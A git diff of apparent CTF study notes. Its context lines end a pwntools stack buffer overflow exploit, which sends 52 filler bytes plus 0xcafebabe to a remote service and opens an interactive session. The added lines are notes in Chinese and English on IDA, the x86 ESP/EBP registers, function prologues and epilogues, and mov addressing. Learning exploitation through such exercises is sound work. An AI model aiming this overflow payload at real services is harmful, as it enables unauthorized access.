@@ -41,3 +41,24 @@ payload = "a"*52+p32(0xcafebabe)
 r.send(payload)
 r.interactive()
 ```
+
+ida 基础：<p>
+ESP：栈指针寄存器(extended stack pointer)，其内存放着一个指针，该指针永远指向系统栈最上面一个栈帧的栈顶。（64位机器变为RSP）
+EBP：基址指针寄存器(extended base pointer)，其内存放着一个指针，该指针永远指向系统栈最上面一个栈帧的栈底。（64位机器变为RBP）
+
+You'll allways find this code at the beginning of functions:
+.text:00401150                 push    ebp
+.text:00401151                 mov     ebp, esp
+It's the prologue, it saves and sets up the registers to start executing the actual code
+
+And this is the epilogue:
+
+.text:00401153                 pop     ebp
+.text:00401154                 retn
+You'll find it after the actual code, it restores the registers and returns.
+
+ebp always points to the top (because the stack grows downwards) of the memory reserved for the autovariables
+
+mov     ebp, 1		: set register ebp equal to 1
+mov     [ebp], 1	: set the memory pointed to by register ebp equal to 1
+mov     [ebp-4], 1	: set the memory pointed to by register ebp - 4 equal to 1
